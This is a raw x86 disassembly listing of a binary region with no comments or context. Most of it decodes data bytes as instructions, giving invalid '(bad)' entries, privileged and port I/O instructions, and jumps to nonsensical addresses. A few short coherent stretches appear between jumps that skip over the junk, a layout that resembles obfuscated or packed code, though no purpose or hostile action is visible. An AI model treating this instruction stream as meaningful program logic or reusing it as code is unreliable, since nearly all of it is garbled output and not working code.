  40bdfd:	mov    ds:0xf1c55df1,eax
  40be02:	popa   
  40be03:	sti    
  40be04:	add    eax,0x7f8a0b4c
  40be09:	rcr    ebx,cl
  40be0b:	add    eax,0xefa2d88
  40be10:	cmp    DWORD PTR [esi-0x225fe1bd],0xcd0ad5f9
  40be1a:	cdq    
  40be1b:	jp     0x40be6b
  40be1d:	rep ins BYTE PTR es:[edi],dx
  40be1f:	add    edi,ecx
  40be21:	dec    eax
  40be22:	push   ecx
  40be23:	sbb    dl,BYTE PTR [edx-0x62]
  40be26:	sar    BYTE PTR [ecx+0x2b],0x46
  40be2a:	mov    bh,0xc5
  40be2c:	mov    ebx,0xd2005f63
  40be31:	push   ebx
  40be32:	sbb    BYTE PTR [edi],dl
  40be34:	inc    eax
  40be35:	fld    st(2)
  40be37:	dec    ecx
  40be38:	pop    es
  40be39:	jp     0x40bddf
  40be3b:	aaa    
  40be3c:	pop    esp
  40be3d:	mov    eax,ds:0xcc8003df
  40be42:	sahf   
  40be43:	mov    al,0x97
  40be45:	xchg   ecx,eax
  40be46:	xchg   edi,eax
  40be47:	mov    ds:0xf8f9bb7f,eax
  40be4c:	call   0x31de8400
  40be51:	mov    ch,0x67
  40be53:	inc    ecx
  40be54:	(bad)  
  40be55:	lods   al,BYTE PTR ds:[esi]
  40be56:	dec    ebx
  40be57:	pop    edx
  40be58:	inc    esp
  40be59:	sbb    DWORD PTR [esi],eax
  40be5b:	fdivr  DWORD PTR [ecx-0x514d9770]
  40be61:	lods   al,BYTE PTR ds:[esi]
  40be62:	les    esp,FWORD PTR [ebp+0x1a]
  40be65:	push   edi
  40be66:	push   eax
  40be67:	fsub   QWORD PTR [eax]
  40be69:	mov    ebx,0x913a7f9f
  40be6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be6f:	enter  0xcad5,0x9e
  40be73:	out    dx,eax
  40be74:	inc    ebp
  40be75:	sub    eax,0x730ac0e4
  40be7a:	pop    ebx
  40be7b:	sub    bh,BYTE PTR [edx+0x491723b0]
  40be81:	xchg   esp,eax
  40be82:	out    0xed,al
  40be84:	ret    
  40be85:	mov    esp,0x13e2ba10
  40be8a:	inc    ebp
  40be8b:	loopne 0x40be7c
  40be8d:	push   ebx
  40be8e:	ficom  WORD PTR [ebx-0xf9d387c]
  40be94:	mov    ch,0x26
  40be96:	add    ah,0xcd
  40be99:	jns    0x40be42
  40be9b:	cmp    bl,bl
  40be9d:	stc    
  40be9e:	adc    esp,DWORD PTR [esp+edx*2]
  40bea1:	xor    al,0xb6
  40bea3:	lea    esi,[esi-0x15]
  40bea6:	push   0x306ceb1
  40beab:	test   DWORD PTR [ebp+0x7d],ebx
  40beae:	inc    ecx
  40beaf:	inc    edi
  40beb0:	adc    eax,0xce135aae
  40beb5:	(bad)
  40bebc:	cmp    DWORD PTR [ecx],esp
  40bebe:	fadd   QWORD PTR [ecx-0x1249e368]
  40bec4:	fwait
  40bec5:	mov    ebp,0x61e97b19
  40beca:	aaa    
  40becb:	push   0x9215d2f2
  40bed0:	les    ecx,FWORD PTR [esi-0x5e]
  40bed3:	test   BYTE PTR [edi],dh
  40bed5:	repz ror ch,cl
  40bed8:	clc    
  40bed9:	shl    DWORD PTR [ebx*8-0x32a12d96],0x33
  40bee1:	call   0x3526:0x473e6a7b
  40bee8:	push   esp
  40bee9:	or     BYTE PTR [ecx+0x7],dl
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x49765e31]
  40bf27:	inc    ecx
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf50
  40bf31:	push   esp
  40bf32:	adc    cl,BYTE PTR [edi+ebp*1-0x6c]
  40bf36:	ss loopne 0x40becc
  40bf39:	mov    eax,ds:0x36007a17
  40bf3e:	pop    esi
  40bf3f:	push   cs
  40bf40:	xor    esp,ecx
  40bf42:	mov    eax,0x4067045f
  40bf47:	aas    
  40bf48:	cmp    ah,BYTE PTR [esp+edi*1]
  40bf4b:	es add eax,0xece3f77a
  40bf51:	jecxz  0x40beef
  40bf53:	out    dx,eax
  40bf54:	rol    ecx,cl
  40bf56:	shl    DWORD PTR [ebx+0x4ab973d3],cl
  40bf5c:	ins    BYTE PTR es:[edi],dx
  40bf5d:	loop   0x40bf6a
  40bf5f:	xor    al,0xfc
  40bf61:	inc    edx
  40bf62:	mov    al,0x51
  40bf64:	pop    ebx
  40bf65:	lahf   
  40bf66:	sub    BYTE PTR [esi],ch
  40bf68:	or     eax,0x9e7ff685
  40bf6d:	jecxz  0x40bef8
  40bf6f:	wrmsr  
  40bf71:	test   BYTE PTR [ebp-0x57],cl
  40bf74:	jge    0x40bf21
  40bf76:	jp     0x40bf4b
  40bf78:	dec    edx
  40bf79:	xchg   ecx,eax
  40bf7a:	int    0xd9
  40bf7c:	gs sub al,0x4f
  40bf7f:	ret    
  40bf80:	scas   al,BYTE PTR es:[edi]
  40bf81:	sbb    al,0xeb
  40bf83:	xchg   esp,eax
  40bf84:	xor    bl,BYTE PTR [ebp+0xbd96e70]
  40bf8a:	fist   WORD PTR [esi-0x230fe7df]
  40bf90:	jge    0x40bf99
  40bf92:	xor    BYTE PTR [edx-0x35],bl
  40bf95:	xor    BYTE PTR [esi-0x7e8b9d5b],cl
  40bf9b:	out    0xea,eax
  40bf9d:	lods   eax,DWORD PTR ds:[esi]
  40bf9e:	mov    WORD PTR [edx+0x75],es
  40bfa1:	std    
  40bfa2:	pop    edi
  40bfa3:	push   0x8ce07ed3
  40bfa8:	je     0x40bf9a
  40bfaa:	sbb    cl,dl
  40bfac:	xor    ah,BYTE PTR [ebp+0x137a1103]
  40bfb2:	ret    0x86a2
  40bfb5:	push   ecx
  40bfb6:	mov    al,0x18
  40bfb8:	sbb    esi,DWORD PTR [ebp-0x7c734fd6]
  40bfbe:	mov    cl,0x8f
  40bfc0:	(bad)  
  40bfc1:	(bad)  
  40bfc2:	and    BYTE PTR [esi+0x26adf956],ch
  40bfc8:	test   eax,0xc024ba5e
  40bfcd:	cdq    
  40bfce:	dec    esp
  40bfcf:	les    eax,FWORD PTR [ecx+0x74]
  40bfd2:	mov    dh,0x4b
  40bfd4:	push   ebp
  40bfd5:	cmc    
  40bfd6:	and    BYTE PTR [eax+0x5e],0x4f
  40bfda:	pop    esp
  40bfdb:	popa   
  40bfdc:	mov    al,0x1e
  40bfde:	dec    ebp
  40bfdf:	mov    ds:0xe7517b1f,eax
  40bfe4:	mov    eax,ds:0x96190990
  40bfe9:	out    dx,al
  40bfea:	js     0x40bfa7
  40bfec:	jno    0x40bfa4
  40bfee:	pop    ebp
  40bfef:	faddp  st(7),st
  40bff1:	add    cl,BYTE PTR [ebp+0x44082046]
  40bff7:	lods   eax,DWORD PTR ds:[esi]
  40bff8:	xchg   esi,eax
  40bff9:	int    0xa0
  40bffb:	inc    ecx
  40bffc:	sahf   
  40bffd:	pop    edi
  40bffe:	dec    edi
  40bfff:	jmp    0x3453:0xe8db9278
  40c006:	hlt    
  40c007:	jmp    0xb7bf937a
  40c00c:	sub    al,0x55
  40c00e:	lea    esp,ds:0xb22788b8
  40c014:	loope  0x40c087
  40c016:	dec    esi
  40c017:	pop    ecx
  40c018:	sbb    al,0x68
  40c01a:	sub    bl,ah
  40c01c:	sti    
  40c01d:	lock test DWORD PTR [ecx+0x233d82d1],ebx
  40c024:	loop   0x40bfc2
  40c026:	jnp    0x40c005
  40c028:	sahf   
  40c029:	mov    cl,0x33
  40c02b:	xchg   ecx,eax
  40c02c:	enter  0x5e61,0x12
  40c030:	jnp    0x40bfbc
  40c032:	mov    bl,0x37
  40c034:	call   ebx
  40c036:	cli    
  40c037:	rol    DWORD PTR [ebx-0xf],cl
  40c03a:	sbb    DWORD PTR [edi-0x1c8caf91],esi
  40c040:	mov    dh,bh
  40c042:	jg     0x40bfc7
  40c044:	add    BYTE PTR [esi-0x4e],al
  40c047:	push   edi
  40c048:	aas    
  40c049:	mov    edi,0xd67333b6
  40c04e:	shr    dh,0xda
  40c051:	mov    ecx,edx
  40c053:	mov    esp,0x27a1e3bb
  40c058:	ins    BYTE PTR es:[edi],dx
  40c059:	mov    eax,ds:0x6a255273
  40c05e:	sub    DWORD PTR [edi-0x35],0x3b
  40c062:	data16 cs mov al,0xa0
  40c066:	faddp  st(4),st
  40c068:	jle    0x40c099
  40c06a:	dec    eax
  40c06b:	rcr    BYTE PTR [ebp-0x248f925e],1
  40c071:	inc    ebp
  40c072:	pop    ecx
  40c073:	shl    BYTE PTR [ebx],0x93
  40c076:	or     BYTE PTR [ecx+0x136e73fe],cl
  40c07c:	mov    ah,0xf9
  40c07e:	jno    0x40c037
  40c080:	(bad)  
  40c081:	xor    eax,DWORD PTR [edx+0x55]
  40c084:	and    al,0xf
  40c086:	rcl    DWORD PTR [edx+ebx*2-0x6b5a94fd],1
  40c08d:	push   eax
  40c08e:	push   ds
  40c08f:	sbb    dh,BYTE PTR [esi+0x4360d6be]
  40c095:	jb     0x40c09b
  40c097:	cs xchg esi,eax
  40c099:	xchg   DWORD PTR [eax],ebx
  40c09b:	adc    ecx,DWORD PTR [ebx-0x35]
  40c09e:	jecxz  0x40c112
  40c0a0:	(bad)  
  40c0a1:	dec    esi
  40c0a2:	mov    ch,0xe9
  40c0a4:	loope  0x40c06d
  40c0a6:	sub    bl,BYTE PTR [edi+esi*1+0x62]
  40c0aa:	xor    ecx,0x3062013b
  40c0b0:	in     al,dx
  40c0b1:	mov    ds:0x9b1de346,eax
  40c0b6:	sub    ah,BYTE PTR [ebp-0xa]
  40c0b9:	movaps xmm1,xmm5
  40c0bc:	sub    edi,DWORD PTR [ecx-0x19b15ccf]
  40c0c2:	pop    ebx
  40c0c3:	dec    esp
  40c0c4:	mov    ebp,0x92c8d3ca
  40c0c9:	mov    bh,0x5a
  40c0cb:	push   es
  40c0cc:	stos   DWORD PTR es:[edi],eax
  40c0cd:	sub    eax,0x1766152c
  40c0d2:	outs   dx,DWORD PTR ds:[esi]
  40c0d3:	sbb    DWORD PTR [esp+ebx*2],eax
  40c0d6:	jmp    0x2c6ea602
  40c0db:	push   ebp
  40c0dc:	jmp    0xbfc1:0xc14abd13
  40c0e3:	stos   BYTE PTR es:[edi],al
  40c0e4:	mov    ebp,ecx
  40c0e6:	dec    eax
  40c0e7:	fisub  WORD PTR [ebx]
  40c0e9:	pop    ss
  40c0ea:	adc    DWORD PTR [ebp+eiz*4+0x7c124502],esi
  40c0f1:	in     al,dx
  40c0f2:	repz js 0x40c101
  40c0f5:	(bad)  
  40c0f6:	rcr    BYTE PTR [edi+0x1d],1
  40c0f9:	sbb    al,0x29
  40c0fb:	dec    edi
  40c0fc:	aam    0x89
  40c0fe:	aaa    
  40c0ff:	ffreep st(2)
  40c101:	push   esp
  40c102:	fidiv  WORD PTR [edi-0x5043d73c]
  40c108:	inc    ecx
  40c109:	ror    BYTE PTR [edx+edi*2+0x5a1c0fb3],1
  40c110:	cmp    ch,BYTE PTR [edx-0x29]
  40c113:	aam    0xf
  40c115:	push   0xb1ab0d8d
  40c11a:	psrlw  mm5,QWORD PTR [ebx]
  40c11d:	mov    dh,0x94
  40c11f:	js     0x40c0e0
  40c121:	and    eax,esi
  40c123:	retf   0x3b48
  40c126:	mov    cl,BYTE PTR [esi]
  40c128:	call   0xcead5fcb
  40c12d:	idiv   ecx
  40c12f:	lds    ecx,FWORD PTR [edx+0x334d9fa1]
  40c135:	sub    eax,0xb39495af
  40c13a:	and    ebx,DWORD PTR [ecx]
  40c13c:	sub    al,0x45
  40c13e:	loope  0x40c0fa
  40c140:	jno    0x40c127
  40c142:	js     0x40c12d
  40c144:	mov    cs,WORD PTR ds:0x91b3a34c
  40c14a:	imul   edx,esp,0x2c598990
  40c150:	nop
  40c151:	jnp    0x40c186
  40c153:	out    dx,al
  40c154:	repnz mov ch,0x34
  40c157:	mov    ah,0x7f
  40c159:	sti    
  40c15a:	ds fucomp st(7)
  40c15d:	xchg   ecx,eax
  40c15e:	cs scas al,BYTE PTR es:[edi]
  40c160:	mov    bh,0x91
  40c162:	mov    eax,DWORD PTR [ecx-0x74]
  40c165:	(bad)  
  40c166:	clts   
  40c168:	push   es
  40c169:	out    0x7,eax
  40c16b:	mov    ebp,0x35f62c9b
  40c170:	push   0xfffffff8
  40c172:	mov    BYTE PTR [edx-0x7e],dh
  40c175:	pop    ebp
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xf4
  40c196:	or     DWORD PTR [esi],ecx
  40c198:	loopne 0x40c1e4
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	pop    ecx
  40c1a2:	or     BYTE PTR ds:0xd5fa16d6,ch
  40c1a8:	pop    esi
  40c1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1aa:	mov    ds:0x620f4c19,eax
  40c1af:	lea    edi,[edx-0x3df71255]
  40c1b5:	jo     0x40c15f
  40c1b7:	sbb    eax,0x8ec6cb8f
  40c1bc:	sub    BYTE PTR [ecx+0x7e],0xfd
  40c1c0:	jle    0x40c167
  40c1c2:	test   al,0xc
  40c1c4:	in     al,0x28
  40c1c6:	xlat   BYTE PTR ds:[ebx]
  40c1c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1c8:	loop   0x40c176
  40c1ca:	div    DWORD PTR [edi+edx*2]
  40c1cd:	dec    ecx
  40c1ce:	jl     0x40c167
  40c1d0:	scas   al,BYTE PTR es:[edi]
  40c1d1:	mov    ds:0x74e90d77,eax
  40c1d6:	jg     0x40c16a
  40c1d8:	push   eax
  40c1d9:	scas   eax,DWORD PTR es:[edi]
  40c1da:	arpl   WORD PTR [eax],cx
  40c1dc:	xchg   esi,eax
  40c1dd:	sti    
  40c1de:	jb     0x40c1c5
  40c1e0:	sub    eax,0x90e34868
  40c1e5:	mov    WORD PTR [ebx],?
  40c1e7:	add    edx,eax
  40c1e9:	aam    0xa3
  40c1eb:	sub    al,0x7d
  40c1ed:	mov    ch,0xe5
  40c1ef:	loopne 0x40c174
  40c1f1:	and    ah,bh
  40c1f3:	inc    ecx
  40c1f4:	mov    esi,0xadfe6736
  40c1f9:	dec    ecx
  40c1fa:	fisub  WORD PTR [ebx+0x5d]
  40c1fd:	cs push ebx
  40c1ff:	cwde   
  40c200:	sbb    ah,BYTE PTR [edx+0x5a]
  40c203:	pop    ecx
  40c204:	pusha  
  40c205:	jmp    0x9ffa:0x4afccb9b
  40c20c:	jno    0x40c1ed
  40c20e:	call   0xfbaa59a
  40c213:	out    dx,al
  40c214:	data16 xor al,0x61
  40c217:	out    dx,al
  40c218:	adc    DWORD PTR [ebp-0x60bd10b0],esi
  40c21e:	pop    ss
  40c21f:	pop    ebx
  40c220:	adc    ebx,edi
  40c222:	or     al,0x40
  40c224:	fsubr  st,st(3)
  40c226:	push   es
  40c227:	adc    eax,0x60dc826b
  40c22c:	or     ch,BYTE PTR [edi+0xb]
  40c22f:	jbe    0x40c289
  40c231:	adc    ecx,esp
  40c233:	cmp    ah,dl
  40c235:	in     eax,0x48
  40c237:	out    dx,eax
  40c238:	push   ss
  40c239:	xor    eax,0x2be388d0
  40c23e:	loop   0x40c207
  40c240:	sbb    al,0x71
  40c242:	push   esi
  40c243:	fcom   DWORD PTR [ecx-0xc]
  40c246:	or     eax,0xf5e65981
  40c24b:	cmp    ebx,0xffffffb1
  40c24e:	push   esp
  40c24f:	lds    esp,FWORD PTR [esi+0x6d]
  40c252:	lar    esp,WORD PTR [ebx+0x2d]
  40c256:	sar    BYTE PTR [edx+0x39caa099],cl
  40c25c:	mov    ah,0x4c
  40c25e:	dec    edx
  40c25f:	mov    esp,0x651f4e8
  40c264:	sbb    edx,DWORD PTR ss:[edx+0x7392d07d]
  40c26b:	pop    ebx
  40c26c:	and    eax,0x5df1878c
  40c271:	jae    0x40c23b
  40c273:	sub    eax,0x8c004f47
  40c278:	outs   dx,DWORD PTR ds:[esi]
  40c279:	dec    esp
  40c27a:	jg     0x40c280
  40c27c:	push   ecx
  40c27d:	push   esp
  40c27e:	push   ebp
  40c27f:	arpl   WORD PTR ds:0x2da43235,si
  40c285:	sub    edx,esi
  40c287:	in     eax,0xb6
  40c289:	or     eax,0xb070716f
  40c28e:	call   0xaf2b:0x23cff61
  40c295:	outs   dx,DWORD PTR ds:[esi]
  40c296:	test   BYTE PTR [ebp+0x2a],0xd7
  40c29a:	scas   eax,DWORD PTR es:[edi]
  40c29b:	mov    ds:0xd1846c70,eax
  40c2a0:	sbb    ecx,edi
  40c2a2:	leave  
  40c2a3:	retf   0x79
  40c2a6:	jne    0x40c230
  40c2a8:	loope  0x40c239
  40c2aa:	pop    ebp
  40c2ab:	loopne 0x40c2b7
  40c2ad:	mov    ds:0x73eee2db,al
  40c2b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2b3:	xlat   BYTE PTR ds:[ebx]
  40c2b4:	sbb    BYTE PTR [ebx+0x267d45c1],bh
  40c2ba:	test   al,0xcf
  40c2bc:	pop    edi
  40c2bd:	xchg   DWORD PTR [esi+edi*1],esi
  40c2c0:	sbb    al,0x34
  40c2c2:	les    ebx,FWORD PTR [ecx-0x69]
  40c2c5:	mov    eax,ds:0x4b6da234
  40c2ca:	rcl    BYTE PTR [edx],1
  40c2cc:	fcmovnu st,st(0)
  40c2ce:	xor    DWORD PTR [eax],0xffffffdb
  40c2d1:	jnp    0x40c345
  40c2d3:	cs test al,0x6d
  40c2d6:	ffree  st(3)
  40c2d8:	in     al,dx
  40c2d9:	popa   
  40c2da:	in     eax,dx
  40c2db:	xchg   ecx,eax
  40c2dc:	in     eax,dx
  40c2dd:	lods   eax,DWORD PTR ds:[esi]
  40c2de:	aam    0x39
  40c2e0:	fwait
  40c2e1:	aam    0x90
  40c2e3:	iret   
  40c2e4:	sub    al,0xb
  40c2e6:	pop    ecx
  40c2e7:	mov    BYTE PTR [eax-0x2f],dl
  40c2ea:	jg     0x40c2a8
  40c2ec:	js     0x40c36d
  40c2ee:	stos   DWORD PTR es:[edi],eax
  40c2ef:	inc    esp
  40c2f0:	push   0x4921acac
  40c2f5:	adc    BYTE PTR [ebx+0x7361fc9c],0x7a
  40c2fc:	lods   al,BYTE PTR ds:[esi]
  40c2fd:	sbb    al,0x3
  40c2ff:	xor    ah,BYTE PTR [eax+0x20]
  40c302:	push   edx
  40c303:	mov    WORD PTR [edx],gs
  40c305:	imul   esp,edx,0x23af856d
  40c30b:	xlat   BYTE PTR ds:[ebx]
  40c30c:	xchg   edx,edi
  40c30e:	enter  0x469e,0x4c
  40c312:	jne    0x40c2c4
  40c314:	fnstcw WORD PTR [ebp-0x466017cf]
  40c31a:	xor    BYTE PTR [esi+0x1c8272a2],0xa5
  40c321:	retf   
  40c322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c323:	xchg   esp,esi
  40c325:	sahf   
  40c326:	data16 rcr bl,1
  40c329:	enter  0xf64f,0x2c
  40c32d:	pop    es
  40c32e:	mov    al,ds:0xffec9377
  40c333:	mov    ds:0x63659b36,al
  40c338:	sbb    eax,0xe64f5c28
  40c33d:	add    esi,DWORD PTR [esi+ebx*8]
  40c340:	push   cs
  40c341:	ficomp WORD PTR [ebx-0x2efac8e2]
  40c347:	jbe    0x40c3c8
  40c349:	mov    ch,0x1e
  40c34b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c34c:	ror    BYTE PTR [edi+0x7a31245e],cl
  40c352:	add    al,0x49
  40c354:	and    al,dl
  40c356:	mov    es,WORD PTR [ebx+0x2ef219b9]
  40c35c:	bound  edx,QWORD PTR [edx]
  40c35e:	in     al,0x1e
  40c360:	out    0x74,eax
  40c362:	jg     0x40c3ba
  40c364:	push   ebx
  40c365:	scas   al,BYTE PTR es:[edi]
  40c366:	mov    eax,ds:0xb70332ea
  40c36b:	add    al,0x9d
  40c36d:	loop   0x40c307
  40c36f:	push   edi
  40c370:	xor    al,0xd7
  40c372:	mov    al,ds:0x33d439d6
  40c377:	mov    eax,0xa3537ac4
  40c37c:	dec    edx
  40c37d:	retf   0x9a9e
  40c380:	les    edx,FWORD PTR [edx+ebp*4]
  40c383:	test   eax,0x7079cdb9
  40c388:	nop
  40c389:	push   es
  40c38a:	xchg   ecx,eax
  40c38b:	into   
  40c38c:	std    
  40c38d:	xor    DWORD PTR [esi-0x1e],esp
  40c390:	adc    DWORD PTR [esi+0x674466db],esi
  40c396:	retf   
  40c397:	(bad)  
  40c398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c399:	mov    ds:0x48822999,al
  40c39e:	push   ebp
  40c39f:	je     0x40c3a4
  40c3a1:	mov    bl,0x76
  40c3a3:	lods   al,BYTE PTR ds:[esi]
  40c3a4:	pop    es
  40c3a5:	inc    ebx
  40c3a6:	and    ebx,DWORD PTR ds:0xa6eaf232
  40c3ac:	int3   
  40c3ad:	jmp    0x40c3f6
  40c3af:	fwait
  40c3b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b1:	mov    BYTE PTR [eax-0x2b],ah
  40c3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b5:	add    eax,0x832963e2
  40c3ba:	js     0x40c3bc
  40c3bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3bd:	pop    edx
  40c3be:	dec    esi
  40c3bf:	loop   0x40c41e
  40c3c1:	or     DWORD PTR [edx+ecx*2],0x54
  40c3c5:	inc    ebp
  40c3c6:	push   ss
  40c3c7:	mov    ds:0x9df920f7,eax
  40c3cc:	fdivr  st(0),st
  40c3ce:	dec    edx
  40c3cf:	dec    ecx
  40c3d0:	scas   al,BYTE PTR es:[edi]
  40c3d1:	mov    edx,0x7b1b6293
  40c3d6:	outs   dx,DWORD PTR ds:[esi]
  40c3d7:	stc    
  40c3d8:	mov    BYTE PTR [ecx+0xa],bh
  40c3db:	jne    0x40c3bb
  40c3dd:	(bad)  [ebx+0x3c]
  40c3e0:	mov    esp,0x2d4d0784
  40c3e5:	cmc    
  40c3e6:	mov    BYTE PTR [ebx+0x54b9fc45],cl
  40c3ec:	or     BYTE PTR [ecx+0x7],dl
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	shr    ecx,cl
  40c447:	sbb    BYTE PTR [edx+edx*4+0x14],0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	sbb    BYTE PTR [edx],0x6b
  40c455:	mov    al,0x6
  40c457:	shr    eax,1
  40c459:	xor    edx,esp
  40c45b:	hlt    
  40c45c:	fsub   DWORD PTR [edi-0x48377f8e]
  40c462:	mov    ds:0x72cc6922,al
  40c467:	repz cwd 
  40c46a:	inc    edx
  40c46b:	dec    ebx
  40c46c:	aam    0x7d
  40c46e:	mov    gs:0x702e8c28,eax
  40c474:	test   DWORD PTR [ebp-0x31a6a8f],edi
  40c47a:	fs fwait
  40c47c:	jmp    0x40c444
  40c47e:	(bad)  
  40c480:	xor    bh,BYTE PTR [edi-0x3d]
  40c483:	hlt    
  40c484:	xchg   ebp,eax
  40c485:	cmp    eax,0x3d57a8c3
  40c48a:	ret    
  40c48b:	leave  
  40c48c:	mov    fs,WORD PTR [edi+0x68a076e1]
  40c492:	(bad)  
  40c493:	(bad)  
  40c494:	xlat   BYTE PTR ds:[ebx]
  40c495:	jns    0x40c48e
  40c497:	jns    0x40c4a0
  40c499:	xchg   ebx,eax
  40c49a:	xchg   ebp,eax
  40c49b:	sub    al,0x5e
  40c49d:	in     al,dx
  40c49e:	sub    edi,DWORD PTR [eax]
  40c4a0:	inc    esp
  40c4a1:	mov    cs:0x7fb36a8f,eax
  40c4a7:	dec    ebp
  40c4a8:	pop    es
  40c4a9:	push   esi
  40c4aa:	inc    ebx
  40c4ab:	sbb    ch,ah
  40c4ad:	ins    DWORD PTR es:[edi],dx
  40c4ae:	rcl    BYTE PTR [ecx],0x75
  40c4b1:	sbb    DWORD PTR [eax],ecx
  40c4b3:	test   eax,0xafa6416a
  40c4b8:	sbb    ebx,DWORD PTR [esi-0x285d143c]
  40c4be:	(bad)  
  40c4bf:	(bad)  
  40c4c0:	fmul   st,st(1)
  40c4c2:	daa    
  40c4c3:	ret    
  40c4c4:	cli    
  40c4c5:	rol    DWORD PTR ds:0xb031d321,0xad
  40c4cc:	enter  0x7a18,0x91
  40c4d0:	dec    edx
  40c4d1:	xor    DWORD PTR [ebx],0xffffff8c
  40c4d4:	and    DWORD PTR [ecx+0x74d4b718],ecx
  40c4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4db:	push   ebp
  40c4dc:	add    eax,0xf65f51a7
  40c4e1:	pop    ecx
  40c4e2:	adc    BYTE PTR [ebx+eiz*1],0x9f
  40c4e6:	cld    
  40c4e7:	inc    ebp
  40c4e8:	adc    eax,0xa358d1a
  40c4ed:	ds and eax,0xbfc9548a
  40c4f3:	ins    BYTE PTR es:[edi],dx
  40c4f4:	sbb    DWORD PTR [edx+0x28875eef],edi
  40c4fa:	shl    ch,0x75
  40c4fd:	mov    eax,0xd7ee8dd4
  40c502:	sub    ebx,DWORD PTR [ecx-0x3b]
  40c505:	gs pop es
  40c507:	xlat   BYTE PTR ds:[ebx]
  40c508:	pop    es
  40c509:	mov    dl,0x48
  40c50b:	gs push 0x6c
  40c50e:	jp     0x40c4f8
  40c510:	xchg   esp,eax
  40c511:	in     eax,0xa4
  40c513:	sub    BYTE PTR [ebx],0x0
  40c516:	mov    bl,0x8a
  40c518:	stos   DWORD PTR es:[edi],eax
  40c519:	outs   dx,BYTE PTR ds:[esi]
  40c51a:	test   BYTE PTR [bp+si+0x1d],ch
  40c51e:	xor    ebp,eax
  40c520:	pushf  
  40c521:	outs   dx,DWORD PTR ds:[esi]
  40c522:	fcmovnb st,st(3)
  40c524:	add    ecx,DWORD PTR [ecx+0xe34a881]
  40c52a:	xchg   ebp,eax
  40c52b:	xchg   BYTE PTR [ecx+0x33],al
  40c52e:	fldcw  WORD PTR [esp+edi*8-0x1e]
  40c532:	sar    BYTE PTR [esi],cl
  40c534:	add    eax,0x70c2af86
  40c539:	retf   
  40c53a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c53b:	mov    dl,0xf9
  40c53d:	jp     0x40c540
  40c53f:	sub    eax,0xfffffff9
  40c542:	add    BYTE PTR [eax],ch
  40c544:	and    DWORD PTR [edx+eax*1-0x44],ebp
  40c548:	shl    edx,1
  40c54a:	add    al,BYTE PTR [ecx+0x65]
  40c54d:	push   0x7d
  40c54f:	push   ss
  40c550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c551:	adc    dl,BYTE PTR [eax-0x68]
  40c554:	std    
  40c555:	or     BYTE PTR [ebx-0x34d950e3],ch
  40c55b:	xchg   ebx,eax
  40c55c:	daa    
  40c55d:	into   
  40c55e:	jne    0x40c58f
  40c560:	popa   
  40c561:	dec    eax
  40c562:	mov    ch,0xf6
  40c564:	test   DWORD PTR [ebx],eax
  40c566:	fdiv   QWORD PTR [esi+0x3a]
